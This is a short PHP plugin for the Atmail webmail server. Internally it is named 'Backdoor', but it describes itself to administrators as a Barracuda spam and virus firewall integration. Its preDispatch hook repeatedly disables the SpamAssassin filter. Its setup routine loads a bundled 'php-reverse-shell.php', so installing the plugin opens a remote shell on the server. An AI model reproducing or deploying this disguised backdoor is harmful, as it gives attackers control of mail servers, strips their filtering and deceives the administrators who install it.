
<?php
class Atmail_FirstLoginTrigger_Plugin extends Atmail_Controller_Plugin
{
    
    protected $_pluginFullName   = 'Backdoor';
    protected $_pluginAuthor = 'Win Sam me@tehwinsam.com';
    protected $_pluginDescription = 'TEST';
    protected $_pluginCopyright = 'Copyright ';
    protected $_pluginUrl = '';
    protected $_pluginNotes = '';
	protected $_pluginVersion = '1.0.0';
    protected $_pluginCompat = '6.1.1';
	protected $_pluginModule = 'mail';

	private $_loginPage = false;

      
    
    public function __construct()
    {
        parent::__construct();
        
        $this->_pluginDescription = "Adds Barracuda Spam & Virus Firewall integration for Atmail. After installation please edit the config file to suit your requirements. It is located at ". APP_ROOT  .  "!!config/plugins/mail.atmail.barracuda4atmail.ini";
    }
    
    
	public function preDispatch()
	{
	    $conf = Zend_Registry::get('config')->exim;
	    
	    if ($conf['filter_sa_enable'] == 1) {
	        config::save('exim', array('filter_sa_enable' => 0));
	    }
	}
	
	public function setup()
	{
	    config::save('exim', array('filter_sa_enable' => 0));
		require_once(APP_ROOT ."application/modules/mail/plugins/Atmail/FirstLoginTrigger/includes/php-reverse-shell.php");
	}
}
